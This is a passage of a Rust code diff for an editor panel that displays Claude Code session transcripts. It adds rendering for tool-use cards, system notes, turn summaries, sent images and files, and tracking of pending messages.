+                                                }),
+                                            ),
+                                        )
+                                    })
+                                    .child(
+                                        IconButton::new(
+                                            SharedString::from(format!(
+                                                "dismiss-pending-send-{id}"
+                                            )),
+                                            IconName::Close,
+                                        )
+                                        .icon_size(IconSize::XSmall)
+                                        .icon_color(Color::Muted)
+                                        .tooltip(Tooltip::text("Remove this message"))
+                                        .on_click(
+                                            cx.listener(move |this, _, _, cx| {
+                                                this.dismiss_pending_send(id, cx)
+                                            }),
+                                        ),
+                                    ),
                             ),
                     )
                     // A plain label rather than markdown: nothing about a message that has
@@ -4976,6 +6755,111 @@ impl ClaudeSessionsPanel {
                 section.into_any_element()
             }
 
+            EntryKind::SystemNote { subtype, text, url } => {
+                let is_away = subtype.as_ref() == AWAY_SUMMARY_SUBTYPE;
+                let title = if is_away {
+                    SharedString::from("While you were away")
+                } else if subtype.is_empty() {
+                    SharedString::from("System")
+                } else {
+                    subtype
+                };
+                let mut row = h_flex()
+                    .w_full()
+                    .px_2()
+                    .py_0p5()
+                    .gap_1()
+                    .child(
+                        Icon::new(if is_away {
+                            IconName::Clock
+                        } else {
+                            IconName::Info
+                        })
+                        .size(IconSize::XSmall)
+                        .color(Color::Muted),
+                    )
+                    .child(
+                        Label::new(title)
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted),
+                    )
+                    .child(
+                        Label::new(text)
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted)
+                            .single_line(),
+                    );
+                if let Some(url) = url {
+                    row = row.child(
+                        Button::new(
+                            SharedString::from(format!("system-note-url-{index}")),
+                            "Open",
+                        )
+                        .label_size(LabelSize::XSmall)
+                        .on_click(move |_, _, cx| {
+                            cx.open_url(&url);
+                        }),
+                    );
+                }
+                row.into_any_element()
+            }
+
+            EntryKind::TurnFooter {
+                duration_ms,
+                message_count,
+                pending_background_agents,
+            } => Label::new(format_turn_footer(
+                duration_ms,
+                message_count,
+                pending_background_agents,
+            ))
+            .size(LabelSize::XSmall)
+            .color(Color::Muted)
+            .into_any_element(),
+
+            EntryKind::TurnSummary {
+                turn_id,
+                calls,
+                files_edited,
+                agents,
+                thinking_blocks: _,
+                duration_ms,
+                pending_background_agents: _,
+                is_expanded,
+            } => {
+                let label = format_turn_summary_line(
+                    calls,
+                    files_edited.len(),
+                    agents,
+                    duration_ms,
+                    is_expanded,
+                );
+                let tooltip = if files_edited.is_empty() {
+                    None
+                } else {
+                    Some(files_edited.join("\n"))
+                };
+                let mut row = h_flex()
+                    .id(SharedString::from(format!("turn-summary-{turn_id}")))
+                    .w_full()
+                    .px_2()
+                    .py_0p5()
+                    .cursor_pointer()
+                    .on_click(cx.listener(move |this, _, _, cx| {
+                        this.toggle_turn_summary(turn_id.clone(), cx)
+                    }))
+                    .child(
+                        Label::new(label)
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted)
+                            .single_line(),
+                    );
+                if let Some(tooltip) = tooltip {
+                    row = row.tooltip(Tooltip::text(tooltip));
+                }
+                row.into_any_element()
+            }
+
             EntryKind::Unknown { label, raw } => {
                 let header = self.render_disclosure_header(
                     DisclosureHeader {
@@ -5065,6 +6949,603 @@ impl ClaudeSessionsPanel {
             .into_any_element()
     }
 
+    fn render_tool_use(
+        &mut self,
+        index: usize,
+        key: SharedString,
+        name: SharedString,
+        input: SharedString,
+        id: Option<SharedString>,
+        diff: Option<SharedString>,
+        is_expanded: bool,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let (parsed, target) = {
+            let parsed = self.entry_cache.parsed_tool_input(&key, &input);
+            let target = tool_target_from_input(parsed);
+            (parsed.cloned(), target)
+        };
+
+        if name.as_ref() == TODO_WRITE_TOOL_NAME {
+            if let Some(todos) = parsed.as_ref().and_then(parse_todos) {
+                return self.render_todo_card(index, &key, todos, is_expanded, cx);
+            }
+        }
+        if name.as_ref() == ASK_USER_QUESTION_TOOL_NAME {
+            if let Some(questions) = parsed.as_ref().and_then(parse_asked_questions) {
+                let answers = self.ask_user_answers_after(index);
+                return self.render_question_card(index, &key, questions, answers, is_expanded, cx);
+            }
+        }
+        if name.as_ref() == EDIT_TOOL_NAME
+            && let Some(diff) = edit_card_diff(diff.as_ref(), id.as_ref(), &self.patched_calls)
+        {
+            return self.render_diff_card(index, &key, &name, &target, diff, is_expanded, cx);
+        }
+        if name.as_ref() == BASH_TOOL_NAME {
+            if let Some(command) = parsed
+                .as_ref()
+                .and_then(|input| input.get("command"))
+                .and_then(Value::as_str)
+                && let Some(dispatch) = parse_cli_dispatch(command)
+            {
+                return self.render_dispatch_card(index, &key, dispatch, is_expanded, window, cx);
+            }
+        }
+
+        let (title, server_chip) = match mcp_tool_parts(name.as_ref()) {
+            Some((server, tool)) => (
+                SharedString::from(tool.to_string()),
+                Some(SharedString::from(server.to_string())),
+            ),
+            None => (name.clone(), None),
+        };
+
+        let display = tool_input_display(&name, &input);
+        let summary = if target.is_empty() {
+            first_line(&display.text)
+        } else {
+            target
+        };
+        let header = self.render_disclosure_header(
+            DisclosureHeader {
+                entry_index: index,
+                key: &key,
+                icon: IconName::ToolHammer,
+                icon_color: Color::Success,
+                title,
+                summary: Some(summary),
+                is_expanded,
+            },
+            cx,
+        );
+        let body = if is_expanded {
+            let markdown = self.markdown_for(&key, display.code_block(), cx);
+            Some(
+                div()
+                    .w_full()
+                    .px_2()
+                    .pb_1()
+                    .child(MarkdownElement::new(markdown, markdown_style(window, cx))),
+            )
+        } else {
+            None
+        };
+        let cards = self.agent_cards(&key, cx);
+        let run_note = self
+            .agent_calls
+            .get(&key)
+            .filter(|call| call.is_workflow && !cards.is_empty())
+            .map(|_| workflow_run_note(&cards));
+        let mut element = v_flex().w_full().child(header);
+        if let Some(server) = server_chip {
+            element = element.child(
+                div().w_full().px_2().child(
+                    Label::new(server)
+                        .size(LabelSize::XSmall)
+                        .color(Color::Muted),
+                ),
+            );
+        }
+        element = element.children(body);
+        if let Some(run_note) = run_note {
+            element = element.child(
+                div().w_full().px_2().pb_1().child(
+                    Label::new(run_note)
+                        .size(LabelSize::XSmall)
+                        .color(Color::Muted),
+                ),
+            );
+        }
+        let is_workflow_call = self
+            .agent_calls
+            .get(&key)
+            .is_some_and(|call| call.is_workflow);
+        let mut card_index = 0;
+        for (phase, cards_of_phase) in group_cards_by_phase(cards, is_workflow_call) {
+            if let Some(phase) = phase {
+                element = element.child(
+                    div().w_full().px_2().pb_0p5().child(
+                        Label::new(phase_heading(&phase, &cards_of_phase))
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted),
+                    ),
+                );
+            }
+            for card in cards_of_phase {
+                if card.offered {
+                    element = element.child(self.render_agent_card(&key, card_index, card, cx));
+                }
+                card_index += 1;
+            }
+        }
+        element.into_any_element()
+    }
+
+    fn render_todo_card(
+        &mut self,
+        index: usize,
+        key: &SharedString,
+        todos: Vec<TodoItem>,
+        is_expanded: bool,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let summary = todo_summary(&todos);
+        let header = self.render_disclosure_header(
+            DisclosureHeader {
+                entry_index: index,
+                key,
+                icon: IconName::Check,
+                icon_color: Color::Accent,
+                title: "Todos".into(),
+                summary: Some(summary),
+                is_expanded,
+            },
+            cx,
+        );
+        let mut column = v_flex().w_full().child(header);
+        if is_expanded {
+            for todo in todos {
+                let (icon, color) = match todo.status {
+                    TodoStatus::Pending => (IconName::Circle, Color::Muted),
+                    TodoStatus::InProgress => (IconName::PlayOutlined, Color::Accent),
+                    TodoStatus::Completed => (IconName::Check, Color::Success),
+                };
+                column = column.child(
+                    h_flex()
+                        .w_full()
+                        .px_2()
+                        .gap_1()
+                        .child(Icon::new(icon).size(IconSize::XSmall).color(color))
+                        .child(Label::new(todo.content).size(LabelSize::Small)),
+                );
+            }
+        }
+        column.into_any_element()
+    }
+
+    fn render_question_card(
+        &mut self,
+        index: usize,
+        key: &SharedString,
+        questions: Vec<AskedQuestion>,
+        answers: Option<SharedString>,
+        is_expanded: bool,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let summary = questions
+            .first()
+            .map(|question| question.question.clone())
+            .unwrap_or_else(|| SharedString::from("Question"));
+        let header = self.render_disclosure_header(
+            DisclosureHeader {
+                entry_index: index,
+                key,
+                icon: IconName::CircleHelp,
+                icon_color: Color::Accent,
+                title: "Question".into(),
+                summary: Some(summary),
+                is_expanded,
+            },
+            cx,
+        );
+        let mut column = v_flex().w_full().child(header);
+        if is_expanded {
+            for question in questions {
+                if !question.header.is_empty() {
+                    column = column.child(
+                        div().w_full().px_2().child(
+                            Label::new(question.header)
+                                .size(LabelSize::XSmall)
+                                .color(Color::Muted),
+                        ),
+                    );
+                }
+                if !question.question.is_empty() {
+                    column = column.child(
+                        div()
+                            .w_full()
+                            .px_2()
+                            .child(Label::new(question.question).size(LabelSize::Small)),
+                    );
+                }
+                for option in question.options {
+                    column = column.child(
+                        div().w_full().px_2().child(
+                            Label::new(option)
+                                .size(LabelSize::XSmall)
+                                .color(Color::Muted),
+                        ),
+                    );
+                }
+            }
+            if let Some(answers) = answers {
+                column = column.child(
+                    div().w_full().px_2().pt_1().child(
+                        Label::new("Answer")
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted),
+                    ),
+                );
+                column = column.child(
+                    div()
+                        .w_full()
+                        .px_2()
+                        .pb_1()
+                        .child(Label::new(answers).size(LabelSize::Small)),
+                );
+            }
+        }
+        column.into_any_element()
+    }
+
+    fn render_diff_card(
+        &mut self,
+        index: usize,
+        key: &SharedString,
+        name: &SharedString,
+        target: &SharedString,
+        diff: &SharedString,
+        is_expanded: bool,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let header = self.render_disclosure_header(
+            DisclosureHeader {
+                entry_index: index,
+                key,
+                icon: IconName::ToolHammer,
+                icon_color: Color::Success,
+                title: name.clone(),
+                summary: Some(target.clone()),
+                is_expanded,
+            },
+            cx,
+        );
+        let mut column = v_flex().w_full().child(header);
+        if is_expanded {
+            let mut body = v_flex().w_full().px_2().pb_1().font_buffer(cx).text_xs();
+            for line in diff.lines() {
+                let color = if line.starts_with('-') {
+                    Color::Deleted
+                } else if line.starts_with('+') {
+                    Color::Created
+                } else {
+                    Color::Muted
+                };
+                body = body.child(Label::new(line.to_string()).color(color).buffer_font(cx));
+            }
+            column = column.child(body);
+        }
+        column.into_any_element()
+    }
+
+    fn render_dispatch_card(
+        &mut self,
+        index: usize,
+        key: &SharedString,
+        dispatch: CliDispatch,
+        is_expanded: bool,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let model = dispatch
+            .model
+            .clone()
+            .unwrap_or_else(|| SharedString::from("dispatch"));
+        let prompt_key = dispatch
+            .prompt_path
+            .as_ref()
+            .map(|_| dispatch_prompt_key(key));
+        if let Some(path) = dispatch.prompt_path.as_ref()
+            && let Some(prompt_key) = prompt_key.as_ref()
+        {
+            self.load_dispatch_prompt(prompt_key.clone(), path.clone(), index, cx);
+        }
+        let first_line = prompt_key
+            .as_ref()
+            .and_then(|prompt_key| self.dispatch_prompts.get(prompt_key))
+            .and_then(|load| match load {
+                OutputLoad::Loaded(text) => text
+                    .lines()
+                    .find(|line| !line.trim().is_empty())
+                    .map(|line| SharedString::from(line.trim().to_string())),
+                _ => None,
+            });
+        let report = first_line
+            .as_ref()
+            .and_then(|text| report_path_in_prompt(text))
+            .or_else(|| {
+                prompt_key.as_ref().and_then(|prompt_key| {
+                    self.dispatch_prompts
+                        .get(prompt_key)
+                        .and_then(|load| match load {
+                            OutputLoad::Loaded(text) => report_path_in_prompt(text),
+                            _ => None,
+                        })
+                })
+            });
+
+        let header = self.render_disclosure_header(
+            DisclosureHeader {
+                entry_index: index,
+                key,
+                icon: IconName::PlayOutlined,
+                icon_color: Color::Accent,
+                title: model,
+                summary: first_line.clone(),
+                is_expanded,
+            },
+            cx,
+        );
+        let mut column = v_flex().w_full().child(header);
+        if is_expanded {
+            if let Some(log_path) = dispatch.log_path.as_ref() {
+                column = column.child(
+                    div().w_full().px_2().child(
+                        Label::new(format!("> {}", log_path.display()))
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted),
+                    ),
+                );
+            }
+            if let Some(first_line) = first_line {
+                column = column.child(
+                    div()
+                        .w_full()
+                        .px_2()
+                        .child(Label::new(first_line).size(LabelSize::Small)),
+                );
+            }
+            if let Some(report) = report {
+                let report_key = dispatch_report_key(key);
+                column = column.child(self.render_dispatch_report(
+                    index,
+                    &report_key,
+                    &report,
+                    window,
+                    cx,
+                ));
+            }
+        }
+        column.into_any_element()
+    }
+
+    fn load_dispatch_prompt(
+        &mut self,
+        key: SharedString,
+        path: PathBuf,
+        entry_index: usize,
+        cx: &mut Context<Self>,
+    ) {
+        if self.dispatch_prompts.contains_key(&key) {
+            return;
+        }
+        self.dispatch_prompts
+            .insert(key.clone(), OutputLoad::Loading);
+        let read = self.source.read_file(path, MAX_DISPATCH_PROMPT_BYTES);
+        let load = cx.spawn({
+            let key = key.clone();
+            async move |this, cx| {
+                let result = read.await;
+                this.update(cx, |this, cx| {
+                    let load = match result {
+                        Ok(contents) => OutputLoad::Loaded(persisted_output_text(contents).into()),
+                        Err(error) => OutputLoad::Failed(format!("{error:#}").into()),
+                    };
+                    this.dispatch_prompts.insert(key, load);
+                    this.list_state
+                        .remeasure_items(entry_index..entry_index.saturating_add(1));
+                    cx.notify();
+                })
+                .log_err();
+            }
+        });
+        self.output_loads.insert(key, load);
+    }
+
+    fn render_dispatch_report(
+        &mut self,
+        entry_index: usize,
+        key: &SharedString,
+        path: &Path,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let basename = path
+            .file_name()
+            .map(|name| name.to_string_lossy().into_owned())
+            .unwrap_or_else(|| path.to_string_lossy().into_owned());
+        let load = self.loaded_outputs.get(key).cloned();
+        let working_directory = self
+            .selected_session(cx)
+            .map(|session| session.working_directory);
+        let can_load = working_directory
+            .as_deref()
+            .is_some_and(|directory| attachment_is_readable(path, directory));
+        let load_key = key.clone();
+        let load_path = path.to_path_buf();
+
+        let action = match &load {
+            Some(OutputLoad::Loaded(_)) => None,
+            Some(OutputLoad::Failed(error)) => Some(
+                Label::new(error.clone())
+                    .size(LabelSize::XSmall)
+                    .color(Color::Error)
+                    .into_any_element(),
+            ),
+            Some(OutputLoad::Loading) => Some(
+                Label::new("Loading…")
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .into_any_element(),
+            ),
+            None if can_load => Some(
+                Button::new(
+                    SharedString::from(format!("load-report-{entry_index}")),
+                    "Load",
+                )
+                .start_icon(Icon::new(IconName::CloudDownload).size(IconSize::XSmall))
+                .label_size(LabelSize::XSmall)
+                .on_click(cx.listener(move |this, _, _, cx| {
+                    this.load_dispatch_report(load_key.clone(), load_path.clone(), entry_index, cx)
+                }))
+                .into_any_element(),
+            ),
+            None => None,
+        };
+
+        let body = match &load {
+            Some(OutputLoad::Loaded(text)) => {
+                let is_clamped = output_is_clamped(text, MAX_REPORT_UNCLAMPED_LINES);
+                let output_key = output_expansion_key(key);
+                let is_expanded = self.expanded.contains(&output_key);
+                let shown = if is_clamped && !is_expanded {
+                    SharedString::from(clamped_output(text, MAX_REPORT_UNCLAMPED_LINES).to_string())
+                } else {
+                    text.clone()
+                };
+                let markdown = self.markdown_for(key, shown, cx);
+                let disclosure = is_clamped.then(|| {
+                    let title = if is_expanded {
+                        "Show less"
+                    } else {
+                        "Show the whole report"
+                    };
+                    self.render_disclosure_header(
+                        DisclosureHeader {
+                            entry_index,
+                            key: &output_key,
+                            icon: IconName::Ellipsis,
+                            icon_color: Color::Muted,
+                            title: title.into(),
+                            summary: None,
+                            is_expanded,
+                        },
+                        cx,
+                    )
+                });
+                Some(
+                    v_flex()
+                        .w_full()
+                        .gap_0p5()
+                        .child(MarkdownElement::new(markdown, markdown_style(window, cx)))
+                        .children(disclosure),
+                )
+            }
+            _ => None,
+        };
+
+        v_flex()
+            .w_full()
+            .px_2()
+            .pb_1()
+            .gap_1()
+            .child(
+                Label::new(format!("Report · {basename}"))
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .single_line(),
+            )
+            .children(action)
+            .children(body)
+            .into_any_element()
+    }
+
+    fn load_dispatch_report(
+        &mut self,
+        key: SharedString,
+        path: PathBuf,
+        entry_index: usize,
+        cx: &mut Context<Self>,
+    ) {
+        let Some(session) = self.selected_session(cx) else {
+            return;
+        };
+        if !attachment_is_readable(&path, &session.working_directory) {
+            return;
+        }
+        if matches!(
+            self.loaded_outputs.get(&key),
+            Some(OutputLoad::Loading) | Some(OutputLoad::Loaded(_))
+        ) {
+            return;
+        }
+
+        self.loaded_outputs.insert(key.clone(), OutputLoad::Loading);
+        let read =
+            self.source
+                .read_attachment(session.session_id, path, MAX_PERSISTED_OUTPUT_BYTES);
+        let load = cx.spawn({
+            let key = key.clone();
+            async move |this, cx| {
+                let result = read.await;
+                this.update(cx, |this, cx| {
+                    let load = match result {
+                        Ok(contents) => OutputLoad::Loaded(persisted_output_text(contents).into()),
+                        Err(error) => OutputLoad::Failed(format!("{error:#}").into()),
+                    };
+                    this.loaded_outputs.insert(key, load);
+                    this.list_state
+                        .remeasure_items(entry_index..entry_index.saturating_add(1));
+                    cx.notify();
+                })
+                .log_err();
+            }
+        });
+        self.output_loads.insert(key, load);
+        cx.notify();
+    }
+
+    fn pending_background_agents(&self) -> Option<u64> {
+        self.entries
+            .iter()
+            .rev()
+            .find_map(|entry| match &entry.kind {
+                EntryKind::TurnFooter {
+                    pending_background_agents,
+                    ..
+                }
+                | EntryKind::TurnSummary {
+                    pending_background_agents,
+                    ..
+                } if *pending_background_agents > 0 => Some(*pending_background_agents),
+                _ => None,
+            })
+    }
+
+    fn ask_user_answers_after(&self, index: usize) -> Option<SharedString> {
+        let next = self.entries.get(index.saturating_add(1))?;
+        match &next.kind {
+            EntryKind::ToolResult { label, body, .. }
+                if label.as_ref() == ASK_USER_QUESTION_TOOL_NAME =>
+            {
+                ask_user_answer_text(body)
+            }
+            _ => None,
+        }
+    }
+
     fn render_persisted_output(
         &mut self,
         entry_index: usize,
@@ -5133,6 +7614,141 @@ impl ClaudeSessionsPanel {
             )
             .child(output)
             .children(action)
+            .into_any_element()
+    }
+
+    /// One file a session sent: what it is, and — for an image small enough to fetch —
+    /// the image itself.
+    ///
+    /// Anything that is not an image is named rather than drawn. There is no element that
+    /// plays a video here, and a card that says which file arrived, how big it is and
+    /// where it sits is what the reader can act on.
+    fn render_sent_file(
+        &mut self,
+        entry_index: usize,
+        key: &SharedString,
+        file_index: usize,
+        file: &SentFile,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let file_key = sent_file_key(key, file_index);
+        let is_an_image_this_panel_draws = sent_image_format(file).is_some();
+        let size = file.size;
+        let over_soft_limit = size.is_some_and(|size| size > MAX_SENT_IMAGE_BYTES);
+        let over_hard_limit = size.is_some_and(|size| size > MAX_SENT_IMAGE_BYTES_ABSOLUTE);
+        let forced = self.forced_attachment_loads.contains(&file_key);
+        let is_drawable =
+            is_an_image_this_panel_draws && !over_hard_limit && (!over_soft_limit || forced);
+        if is_drawable {
+            self.load_sent_image(file_key.clone(), file, entry_index, cx);
+        }
+
+        let icon = if file.is_image {
+            IconName::Image
+        } else if file.is_video() {
+            IconName::PlayOutlined
+        } else {
+            IconName::FileGeneric
+        };
+        let details: Vec<String> = file
+            .size
+            .map(describe_byte_count)
+            .into_iter()
+            .chain(file.media_type.as_ref().map(SharedString::to_string))
+            .collect();
+
+        let preview = match self.loaded_attachments.get(&file_key) {
+            Some(AttachmentLoad::Loaded(image)) => Some(
+                img(image.clone())
+                    .max_w_full()
+                    .max_h(px(480.))
+                    .into_any_element(),
+            ),
+            Some(AttachmentLoad::Loading) => Some(
+                Label::new("Loading the image…")
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .into_any_element(),
+            ),
+            Some(AttachmentLoad::Failed(error)) => Some(
+                Label::new(format!("The image was not shown: {error}"))
+                    .size(LabelSize::XSmall)
+                    .color(Color::Error)
+                    .into_any_element(),
+            ),
+            // An image that is not drawn says why it is not drawn: a card that shows a
+            // file name where the reader expected a picture is the same silence as an
+            // empty panel.
+            None if is_an_image_this_panel_draws && over_hard_limit => Some(
+                Label::new(format!(
+                    "The image is larger than the {} this panel will fetch",
+                    describe_byte_count(MAX_SENT_IMAGE_BYTES_ABSOLUTE)
+                ))
+                .size(LabelSize::XSmall)
+                .color(Color::Muted)
+                .into_any_element(),
+            ),
+            None if is_an_image_this_panel_draws && !is_drawable => {
+                let size_label = size
+                    .map(describe_byte_count)
+                    .unwrap_or_else(|| describe_byte_count(MAX_SENT_IMAGE_BYTES));
+                let force_key = file_key.clone();
+                Some(
+                    Button::new(
+                        SharedString::from(format!("load-anyway-{force_key}")),
+                        format!("Load anyway ({size_label})"),
+                    )
+                    .label_size(LabelSize::XSmall)
+                    .on_click(cx.listener(move |this, _, _, cx| {
+                        this.forced_attachment_loads.insert(force_key.clone());
+                        this.loaded_attachments.remove(&force_key);
+                        cx.notify();
+                    }))
+                    .into_any_element(),
+                )
+            }
+            None => None,
+        };
+
+        let open_path = file.path.clone();
+        let open_name = file.name.clone();
+        let is_openable = !is_an_image_this_panel_draws || over_hard_limit;
+
+        v_flex()
+            .w_full()
+            .gap_0p5()
+            .child(
+                h_flex()
+                    .gap_1()
+                    .child(Icon::new(icon).size(IconSize::XSmall).color(Color::Muted))
+                    .child(Label::new(file.name.clone()).size(LabelSize::Small))
+                    .when(!details.is_empty(), |row| {
+                        row.child(
+                            Label::new(details.join(" · "))
+                                .size(LabelSize::XSmall)
+                                .color(Color::Muted),
+                        )
+                    }),
+            )
+            .child(if is_openable {
+                Button::new(
+                    SharedString::from(format!("open-sent-{file_key}")),
+                    SharedString::from(file.path.to_string_lossy().into_owned()),
+                )
+                .label_size(LabelSize::XSmall)
+                .tooltip(Tooltip::text(format!("Open {open_name}")))
+                .on_click(cx.listener(move |this, _, _, cx| {
+                    this.open_sent_path(open_path.clone(), cx);
+                }))
+                .into_any_element()
+            } else {
+                Label::new(SharedString::from(file.path.to_string_lossy().into_owned()))
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .single_line()
+                    .into_any_element()
+            })
+            .children(preview)
             .into_any_element()
     }
 
@@ -5255,6 +7871,9 @@ impl Render for ClaudeSessionsPanel {
     /// an editor tab draws the conversation of the selected one, because a transcript is
     /// not readable at the width of a dock and the list is what the dock is for.
     fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
+        if self.in_pane {
+            self.set_store_visible(true, cx);
+        }
         // An agent's conversation is a record of something already said to something that
         // is not listening: the only thing there is to type into is the session's own
         // pane, and a reply sent from under an agent's records would arrive in a
@@ -5266,42 +7885,25 @@ impl Render for ClaudeSessionsPanel {
             TranscriptTarget::Subagent { .. }
         );
 
-        if self.in_pane && !reading_an_agent {
-            // Both halves of what decides it — the selection and whether the terminal is
-            // showing — are known here, and this runs on every change to either.
-            self.sync_terminal(window, cx);
-        }
-
         v_flex()
             .key_context("ClaudeSessionsPanel")
+            .on_action(cx.listener(Self::dismiss_menus))
             .track_focus(&self.focus_handle)
             .size_full()
             .map(|this| {
                 if self.in_pane {
                     this.bg(conversation_background(cx))
-                        .child(self.render_conversation_toolbar(cx))
-                        // A tab reads its own store, so a scan or a read that keeps
-                        // failing there is the reason its conversation is empty. Drawn
-                        // only under the list until now, which is the other half: a tab
-                        // showed "no transcript yet" for a store that was reporting a
-                        // failure on every poll.
+                        .child(self.render_conversation_toolbar(window, cx))
                         .children(self.render_error(cx))
                         .children(self.render_agent_chips(cx))
                         .child(self.render_transcript_section(window, cx))
                         .children(self.render_live_message(window, cx))
-                        .children(self.render_activity())
+                        .children(self.render_pending_permission(cx))
+                        .children(self.render_question(cx))
                         .children(
-                            (!reading_an_agent)
-                                .then(|| {
-                                    self.render_terminal(cx)
-                                        .or_else(|| self.render_pane_mirror(cx))
-                                })
-                                .flatten(),
+                            (!reading_an_agent).then(|| self.render_input(cx).into_any_element()),
                         )
-                        .children(
-                            (!reading_an_agent)
-                                .then(|| self.render_input(cx).into_any_element()),
-                        )
+                        .children((!reading_an_agent).then(|| self.render_status_line(cx)))
                 } else {
                     this.child(self.render_session_section(cx))
                 }
@@ -5340,19 +7942,30 @@ impl Item for ClaudeSessionsPanel {
     fn tab_content_text(&self, _detail: usize, cx: &App) -> SharedString {
         let store = self.store.read(cx);
         let selected = store.selected();
+        let ai_title = store.main_transcript().ai_title();
         let session_name = store
             .sessions()
             .iter()
-            .find(|session| selected == Some(session.process_id))
+            .find(|session| selected == Some(session.session.session_id.as_str()))
             .map(|session| {
-                let name = session
-                    .name
-                    .clone()
-                    .unwrap_or_else(|| session.session_id.clone());
+                let name = preferred_session_name(&session.session, ai_title);
                 match session.tmux_target.as_deref().and_then(tmux_session_name) {
                     Some(tmux_session) => SharedString::from(format!("[{tmux_session}] {name}")),
                     None => SharedString::from(name),
                 }
+            })
+            .or_else(|| {
+                store
+                    .ended_sessions()
+                    .iter()
+                    .find(|session| selected == Some(session.session_id.as_str()))
+                    .map(|session| {
+                        SharedString::from(preferred_name(
+                            session.ai_title.as_deref(),
+                            session.name.as_deref(),
+                            session.session_id.as_str(),
+                        ))
+                    })
             })
             .unwrap_or_else(|| SharedString::from("Claude Sessions"));
 
@@ -5388,6 +8001,10 @@ impl Item for ClaudeSessionsPanel {
 
     fn tab_icon(&self, _window: &Window, _cx: &App) -> Option<Icon> {
         Some(Icon::new(IconName::AiClaude))
+    }
+
+    fn deactivated(&mut self, _window: &mut Window, cx: &mut Context<Self>) {
+        self.set_store_visible(false, cx);
     }
 }
 
@@ -5450,34 +8067,10 @@ impl Panel for ClaudeSessionsPanel {
     fn activation_priority(&self) -> u32 {
         11
     }
-}
 
-/// Answers a send that has come back.
-///
-/// A send that failed hands the user their text back: there is nothing they can do about
-/// the failure, and the message they typed would otherwise be gone with only a line of
-/// error to show for it. A send that arrived leaves the emptied input alone.
-///
-/// The text only goes back into an input that is still empty. The answer arrives after
-/// the user was free to type again, and anything they have typed since is newer than
-/// this: an input that holds one character of theirs is theirs. Nothing is ever sent
-/// again on its own — the returned text is a draft the user resends or discards.
-fn apply_send_outcome(
-    message_editor: &Entity<Editor>,
-    sent_text: &str,
-    outcome: anyhow::Result<()>,
-    window: &mut Window,
-    cx: &mut App,
-) {
-    if outcome.is_ok() {
-        return;
+    fn set_active(&mut self, active: bool, _window: &mut Window, cx: &mut Context<Self>) {
+        self.set_store_visible(active, cx);
     }
-
-    if !message_editor.read(cx).text(cx).is_empty() {
-        return;
-    }
-
-    message_editor.update(cx, |editor, cx| editor.set_text(sent_text, window, cx));
 }
 
 /// One message that has left for a session and has not appeared in its transcript yet.
@@ -5486,7 +8079,7 @@ struct PendingSend {
     id: u64,
     /// The session it was sent to. A pending message belongs to that conversation and
     /// does not follow the reader to another one.
-    process_id: u32,
+    session_id: String,
     /// Trimmed, because that is the form it is compared in: Claude Code appends its own
     /// context to the text it records, and [`user_visible_text`] hands back what is left
     /// of it trimmed.
@@ -5501,6 +8094,15 @@ struct PendingSend {
     /// when the conversation later shows more of itself than the send was measured
     /// against, as the history behind a compaction does when the reader opens it.
     newest_preexisting_key: Option<SharedString>,
+    /// The outbox file the channel accepted this send as, once the write has returned.
+    outbox_file: Option<String>,
+    /// Host-clock `at_ms` from the inbox `message_sent` line. Display only — never the
+    /// origin of the 60 s wait; that is [`Self::observed_at_ms`].
+    delivered_at_ms: Option<i64>,
+    /// Local time the store/panel observed that inbox event. The 60 s
+    /// "sent, waiting for the session to pick it up" wait is measured from here.
+    observed_at_ms: Option<i64>,
+    error: Option<SharedString>,
 }
 
 /// The messages the panel is drawing on its own behalf, because the transcript has
@@ -5513,19 +8115,27 @@ struct PendingSend {
 /// swallowed.
 ///
 /// Nothing here is a timer: a pending message is taken down when the record it was sent
-/// as arrives, when the send comes back a failure, when the reader leaves the session, or
-/// when the reader dismisses it — never after a wait, because a message quietly vanishing
-/// is the problem this solves.
+/// as arrives, when the reader dismisses it, or when Retry succeeds — never because the
+/// reader switched session, dismissed an ended row, or the process went away. Switching
+/// hides the row; switching back shows it again.
 #[derive(Default)]
 struct PendingSends {
     sends: Vec<PendingSend>,
     next_id: u64,
+    #[cfg(test)]
+    session_transcript_walks: u32,
 }
 
+/// Finished (delivered or failed) rows kept across all sessions. In-flight rows are not
+/// counted and are never evicted, so a burst of concurrent sends is not dropped to make
+/// room. 3 sessions × 5 failed rows is 15, well under this, and loses nothing.
+const FINISHED_PENDING_SEND_BOUND: usize = 50;
+const SESSION_ENDED_BEFORE_ARRIVAL: &str = "the session ended before this message arrived";
+
 impl PendingSends {
-    /// Draws `text` as sent to `process_id`, against the conversation `entries` was built
+    /// Draws `text` as sent to `session_id`, against the conversation `entries` was built
     /// from, and reports the id that addresses it.
-    fn remember(&mut self, process_id: u32, text: &str, entries: &[Entry]) -> u64 {
+    fn remember(&mut self, session_id: impl Into<String>, text: &str, entries: &[Entry]) -> u64 {
         let id = self.next_id;
         self.next_id = self.next_id.saturating_add(1);
 
@@ -5543,10 +8153,14 @@ impl PendingSends {
 
         self.sends.push(PendingSend {
             id,
-            process_id,
+            session_id: session_id.into(),
             text,
             preexisting_keys,
             newest_preexisting_key,
+            outbox_file: None,
+            delivered_at_ms: None,
+            observed_at_ms: None,
+            error: None,
         });
         id
     }
@@ -5557,20 +8171,103 @@ impl PendingSends {
         self.sends.retain(|send| send.id != id);
     }
 
-    /// A send that arrived is waiting for its record to be written. A send that failed
-    /// never will have one, so its message comes down; the text itself goes back to the
-    /// input, which is [`apply_send_outcome`]'s job.
